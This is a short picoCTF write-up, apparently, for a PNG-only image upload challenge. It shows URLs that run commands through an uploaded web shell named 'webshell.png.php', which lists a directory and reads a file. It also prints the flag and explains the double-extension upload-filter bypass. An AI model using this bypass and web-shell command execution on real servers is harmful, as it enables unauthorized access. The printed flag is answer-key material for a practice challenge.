## Descripción 
I found a web app that can help process images: PNG images only!

Try it [here](http://atlas.picoctf.net:56752/)!
## Solución 
```
http://atlas.picoctf.net:56752/uploads/webshell.png.php
http://atlas.picoctf.net:56752/uploads/webshell.png.php?cmd=ls%20..
http://atlas.picoctf.net:56752/uploads/webshell.png.php?cmd=cat%20../HFQWKODGMIYTO.txt
```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}
## Notas adicionales 
*  Al nombrar el archivo `webshell.png.php`, el servidor lo interpretó como PHP pero pasó el filtro de nombre (por contener `png`). Este es un bypass clásico de filtros de subida
## Referencias
* Deepseek